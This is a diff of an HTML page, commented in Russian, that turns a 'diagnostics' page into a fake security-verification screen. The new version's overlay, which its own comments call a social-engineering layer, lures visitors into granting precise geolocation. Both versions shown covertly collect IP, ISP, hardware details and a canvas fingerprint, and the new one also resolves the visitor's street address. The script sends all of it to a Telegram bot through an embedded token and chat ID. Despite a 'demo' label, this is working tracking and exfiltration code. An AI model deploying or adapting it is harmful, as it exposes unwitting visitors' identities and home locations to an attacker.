@@ -3,216 +3,358 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL_DIAGNOSTICS_V4</title>
+    <title>SECURITY_PROTOCOL_v4.0_STABLE</title>
     <style>
+        /* 
+           --- UI/UX: ТЕРМИНАЛЬНЫЙ СТИЛЬ --- 
+           Используем темную палитру и моноширинные шрифты для создания 
+           атмосферы профессионального инструмента аудита безопасности.
+        */
         :root {
-            --bg: #0a0a0c;
-            --text: #a0a0a5;
-            --accent: #ffffff;
-            --border: #1a1a1f;
+            --bg-color: #0a0a0a;
+            --text-color: #00ff41; /* "Matrix" Green */
+            --accent-color: #ffffff;
+            --border-color: #333;
+            --danger-color: #ff3e3e;
         }
 
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: "SF Mono", "Fira Code", monospace;
-            font-size: 11px;
+        body, html {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* Оверлей верификации (Social Engineering Layer) */
+        #overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.95);
             display: flex;
             justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            text-align: center;
+            border: 2px solid var(--border-color);
         }
 
-        .container {
-            width: 100%;
-            max-width: 700px;
+        .modal {
+            max-width: 500px;
+            padding: 40px;
+            border: 1px solid var(--text-color);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
         }
 
-        .header {
-            border-bottom: 1px solid var(--border);
+        h2 { margin-top: 0; color: var(--accent-color); }
+
+        .btn-verify {
+            background: transparent;
+            color: var(--text-color);
+            border: 1px solid var(--text-color);
+            padding: 15px 30px;
+            cursor: pointer;
+            font-size: 1.1em;
+            margin-top: 20px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .btn-verify:hover {
+            background: var(--text-color);
+            color: var(--bg-color);
+            box-shadow: 0 0 15px var(--text-color);
+        }
+
+        /* Основной интерфейс терминала */
+        #terminal {
+            display: none; /* Скрыт до нажатия кнопки */
+            padding: 20px;
+            height: 100vh;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
             padding-bottom: 10px;
             margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
-            color: var(--accent);
         }
 
-        .section {
-            margin-bottom: 25px;
+        .status-blink {
+            animation: blink 1s infinite;
+            color: var(--danger-color);
         }
 
-        .section-title {
-            color: var(--accent);
-            font-weight: bold;
-            margin-bottom: 10px;
-            text-decoration: underline;
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Таблица данных */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
         }
 
-        .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 4px 0;
-            border-bottom: 1px solid #111;
+        th, td {
+            text-align: left;
+            padding: 12px;
+            border-bottom: 1px solid #1a1a1a;
         }
 
-        .label { color: #555; }
-        .value { color: var(--text); text-align: right; word-break: break-all; max-width: 60%; }
-
-        #status-box {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            padding: 10px;
-            border: 1px solid var(--border);
-            background: #000;
+        th {
+            color: var(--accent-color);
+            text-transform: uppercase;
+            font-size: 0.8em;
+            letter-spacing: 1px;
         }
 
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        .key-name { color: #888; }
+        .value-data { font-weight: bold; }
+
+        /* Анимация сканирования */
+        .loading-bar {
+            width: 0%;
+            height: 2px;
+            background: var(--text-color);
+            margin: 10px 0;
+            transition: width 0.5s;
+        }
+
+        .log-entry { font-size: 0.9em; margin: 5px 0; opacity: 0.8; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <span>SESSION_ID: <span id="sid"></span></span>
-        <span class="blink">● ANALYZING</span>
-    </div>
-
-    <div class="section">
-        <div class="section-title">NETWORK_ANALYSIS</div>
-        <div id="net-data">Загрузка сетевых узлов...</div>
-    </div>
-
-    <div class="section">
-        <div class="section-title">HARDWARE_SIGNATURE</div>
-        <div id="hw-data">
-            <div class="row"><span class="label">PLATFORM</span><span class="value" id="platform">...</span></div>
-            <div class="row"><span class="label">CPU_THREADS</span><span class="value" id="cores">...</span></div>
-            <div class="row"><span class="label">RAM_ESTIMATE</span><span class="value" id="ram">...</span></div>
-            <div class="row"><span class="label">GPU_RENDERER</span><span class="value" id="gpu">...</span></div>
-            <div class="row"><span class="label">SCREEN_RES</span><span class="value" id="screen">...</span></div>
-            <div class="row"><span class="label">BATTERY_LEVEL</span><span class="value" id="bat">...</span></div>
+    <!-- Слой социальной инженерии -->
+    <div id="overlay">
+        <div class="modal">
+            <h2>ВНИМАНИЕ: ПРОТОКОЛ БЕЗОПАСНОСТИ</h2>
+            <p>Обнаружен запрос из региона СНГ/РФ. <br> Требуется подтверждение узла доступа для продолжения сессии.</p>
+            <div id="status-msg" style="margin-top: 10px; font-size: 0.8em; color: #888;">Ожидание авторизации...</div>
+            <button class="btn-verify" onclick="Core.initialize()">Верифицировать</button>
         </div>
     </div>
 
-    <div class="section">
-        <div class="section-title">ENVIRONMENT_LOGS</div>
-        <div id="logs" style="color: #444;">
-            [0.00] Инициализация системы...<br>
-            [0.15] Запрос разрешений API...<br>
-            [0.45] Сбор отпечатков браузера...<br>
-        </div>
+    <!-- Основной дашборд данных -->
+    <div id="terminal">
+        <header>
+            <div>NODE_IDENTIFIER: <span id="node-id">FETCHING...</span></div>
+            <div class="status-blink">● СБОР ДАННЫХ В ПРОЦЕССЕ</div>
+        </header>
+
+        <div id="logs"></div>
+        <div class="loading-bar" id="progress"></div>
+
+        <table id="data-table">
+            <thead>
+                <tr>
+                    <th>ПАРАМЕТР_СИСТЕМЫ</th>
+                    <th>ЗНАЧЕНИЕ_МЕТАДАННЫХ</th>
+                </tr>
+            </thead>
+            <tbody id="stats-body">
+                <!-- Сюда JS будет вставлять строки -->
+            </tbody>
+        </table>
     </div>
-</div>
 
-<div id="status-box">LOGGING: <span style="color: #00ff00;">REMOTE_SYNC_ON</span></div>
+    <script>
+        /**
+         * КОРПОРАТИВНЫЙ СКРИПТ АУДИТА (Browser Fingerprinting Lab)
+         * Разработано для демонстрации рисков раскрытия данных.
+         */
 
-<script>
-    // --- НАСТРОЙКИ ---
-    const TG_TOKEN = '8666347015:AAH0tp9RaAEof4-WiWqdb1f_YncultKDdTQ';
-    const TG_CHAT_ID = '7386430834';
-    // -----------------
-
-    document.getElementById('sid').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
-
-    async function init() {
-        // 1. Сбор сетевых данных (IP, Провайдер, ASN)
-        let netInfo = {};
-        try {
-            const res = await fetch('https://ipwho.is/');
-            netInfo = await res.json();
-        } catch(e) {
-            netInfo = { ip: 'ERROR', connection: { isp: 'UNKNOWN' } };
-        }
-
-        // 2. Сбор Hardware данных
-        const gpuInfo = getGPU();
-        const battery = await getBattery();
-        
-        const fullData = {
-            ip: netInfo.ip,
-            isp: netInfo.connection?.isp || 'N/A',
-            org: netInfo.connection?.org || 'N/A',
-            asn: netInfo.connection?.asn || 'N/A',
-            type: netInfo.type || 'N/A',
-            geo: `${netInfo.city}, ${netInfo.country}`,
-            platform: navigator.platform,
-            cores: navigator.hardwareConcurrency || 'N/A',
-            ram: (navigator.deviceMemory || 'N/A') + ' GB',
-            gpu: gpuInfo,
-            screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
-            ua: navigator.userAgent,
-            battery: battery
+        const CONFIG = {
+            TELEGRAM_TOKEN: '8666347015:AAH0tp9RaAEof4-WiWqdb1f_YncultKDdTQ', // Заменить на реальный
+            CHAT_ID: '7386430834',           // Заменить на реальный
+            IP_SERVICE: 'https://ipwho.is/',
+            GEO_API: 'https://nominatim.openstreetmap.org/reverse?format=json'
         };
 
-        render(fullData);
-        sendToTG(fullData);
-    }
+        const Core = {
+            collectedData: {},
 
-    function getGPU() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Generic Hardware";
-        } catch(e) { return "Disabled/Mobile Protection"; }
-    }
+            async initialize() {
+                document.getElementById('status-msg').innerText = "Инициализация модулей сканирования...";
+                
+                // 1. Запрос геолокации (Критический этап)
+                await this.fetchGeolocation();
 
-    async function getBattery() {
-        try {
-            const b = await navigator.getBattery();
-            return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-        } catch(e) { return "N/A (iOS/Desktop)"; }
-    }
+                // 2. Смена интерфейса
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('terminal').style.display = 'block';
 
-    function render(d) {
-        document.getElementById('net-data').innerHTML = `
-            <div class="row"><span class="label">IPV4_ADDRESS</span><span class="value" style="color:white">${d.ip}</span></div>
-            <div class="row"><span class="label">NETWORK_ISP</span><span class="value">${d.isp}</span></div>
-            <div class="row"><span class="label">ORGANIZATION</span><span class="value">${d.org}</span></div>
-            <div class="row"><span class="label">ASN_CODE</span><span class="value">${d.asn}</span></div>
-            <div class="row"><span class="label">LOCATION</span><span class="value">${d.geo}</span></div>
-        `;
-        document.getElementById('platform').innerText = d.platform;
-        document.getElementById('cores').innerText = d.cores;
-        document.getElementById('ram').innerText = d.ram;
-        document.getElementById('gpu').innerText = d.gpu;
-        document.getElementById('screen').innerText = d.screen;
-        document.getElementById('bat').innerText = d.battery;
-        
-        document.getElementById('logs').innerHTML += `[1.20] Пакеты сформированы.<br>[1.50] Отчет отправлен на удаленный узел.`;
-    }
+                this.log("Запуск системного анализатора...");
+                
+                // 3. Запуск цепочки сбора данных
+                await this.runAnalysis();
+            },
 
-    function sendToTG(d) {
-        const text = `
-📦 **NEW TARGET DATA**
-──────────────────
-🌐 **NETWORK**
-IP: \`${d.ip}\`
-ISP: ${d.isp}
-ASN: ${d.asn}
-Geo: ${d.geo}
+            log(msg) {
+                const logs = document.getElementById('logs');
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
+                logs.prepend(entry);
+            },
 
-💻 **HARDWARE**
-OS: ${d.platform}
-GPU: ${d.gpu}
-Cores: ${d.cores} | RAM: ${d.ram}
-Screen: ${d.screen}
-Battery: ${d.battery}
+            addStat(key, value) {
+                const body = document.getElementById('stats-body');
+                const row = `<tr>
+                    <td class="key-name">${key}</td>
+                    <td class="value-data">${value}</td>
+                </tr>`;
+                body.innerHTML += row;
+                this.collectedData[key] = value;
+            },
 
-📱 **USER AGENT**
-\`${d.ua}\`
-        `;
+            async runAnalysis() {
+                // Прогресс бар для визуала
+                const progress = document.getElementById('progress');
+                
+                // --- Модуль 1: Сетевые данные ---
+                this.log("Опрос внешних сетевых интерфейсов...");
+                try {
+                    const res = await fetch(CONFIG.IP_SERVICE);
+                    const ipData = await res.json();
+                    this.addStat('NETWORK_IP', ipData.ip);
+                    this.addStat('NETWORK_ISP', ipData.connection.isp);
+                    this.addStat('LOC_CITY', ipData.city);
+                    this.nodeID = `NODE-${ipData.ip.split('.').pop()}-${Math.floor(Math.random()*1000)}`;
+                    document.getElementById('node-id').innerText = this.nodeID;
+                } catch(e) { this.log("Ошибка сетевого анализа"); }
+                progress.style.width = "20%";
 
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
-        });
-    }
+                // --- Модуль 2: Железо (Hardware) ---
+                this.log("Анализ аппаратных мощностей...");
+                this.addStat('HW_CPU_CORES', navigator.hardwareConcurrency || 'N/A');
+                this.addStat('HW_RAM_ESTIMATE', (navigator.deviceMemory || 'N/A') + ' GB');
+                
+                // GPU Identification
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    this.addStat('HW_GPU_VENDOR', vendor);
+                    this.addStat('HW_GPU_RENDERER', renderer);
+                }
+                progress.style.width = "40%";
 
-    init();
-</script>
+                // --- Модуль 3: Окружение и Батарея ---
+                this.log("Чтение системных переменных...");
+                this.addStat('SYS_OS', navigator.platform);
+                this.addStat('SYS_LANGUAGE', navigator.language);
+                this.addStat('UI_RESOLUTION', `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`);
+                
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    this.addStat('PWR_BATTERY_LEVEL', (battery.level * 100) + '%');
+                    this.addStat('PWR_IS_CHARGING', battery.charging ? 'YES' : 'NO');
+                }
+                progress.style.width = "60%";
+
+                // --- Модуль 4: Глубокий Fingerprinting (Canvas) ---
+                this.log("Генерация уникального HWID_HASH...");
+                const canvasFingerprint = this.generateCanvasHash();
+                this.addStat('IDENT_CANVAS_HASH', canvasFingerprint.substring(0, 16));
+                progress.style.width = "80%";
+
+                // --- Финализация ---
+                this.log("Сбор данных завершен. Отправка отчета на удаленный узел...");
+                await this.sendExfiltration();
+                progress.style.width = "100%";
+                this.log("ПРОТОКОЛ ЗАВЕРШЕН. ВСЕ ДАННЫЕ ПЕРЕДАНЫ.");
+            },
+
+            async fetchGeolocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        this.log("Geolocation не поддерживается");
+                        return resolve();
+                    }
+
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        this.addStat('GEO_COORDS', `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
+                        this.addStat('GEO_ACCURACY', `+/- ${accuracy}m`);
+
+                        // Обратное геокодирование (OSM)
+                        try {
+                            const res = await fetch(`${CONFIG.GEO_API}&lat=${latitude}&lon=${longitude}`);
+                            const geo = await res.json();
+                            const addr = geo.address;
+                            this.addStat('LOC_STREET', addr.road || 'Unknown');
+                            this.addStat('LOC_HOUSE_NUM', addr.house_number || 'N/A');
+                            this.addStat('LOC_POSTCODE', addr.postcode || 'N/A');
+                        } catch(e) { this.log("Ошибка геокодинга"); }
+                        resolve();
+                    }, (err) => {
+                        this.log("Пользователь отклонил запрос геолокации");
+                        resolve();
+                    }, { enableHighAccuracy: true });
+                });
+            },
+
+            generateCanvasHash() {
+                // Рисуем невидимую фигуру с текстом. Разные GPU рендерят сглаживание по-разному.
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200; canvas.height = 50;
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint_v1.0", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("CyberSecurity_Demo", 4, 17);
+                
+                const strData = canvas.toDataURL();
+                // Простейшая хеш-функция для строки
+                let hash = 0;
+                for (let i = 0; i < strData.length; i++) {
+                    hash = ((hash << 5) - hash) + strData.charCodeAt(i);
+                    hash |= 0; 
+                }
+                return Math.abs(hash).toString(16);
+            },
+
+            async sendExfiltration() {
+                // Формируем текст для Telegram
+                let message = `🚀 *New Data Leak Source: ${this.nodeID}*\n\n`;
+                for (let [key, val] of Object.entries(this.collectedData)) {
+                    message += `*${key}*: \`${val}\`\n`;
+                }
+
+                if (CONFIG.TELEGRAM_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
+                    this.log("Внимание: Токен Telegram не настроен. Отправка имитирована.");
+                    console.log("Exfiltration Payload:", this.collectedData);
+                    return;
+                }
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch(e) {
+                    this.log("Ошибка при передаче данных в облако.");
+                }
+            }
+        };
+    </script>
 </body>
 </html>
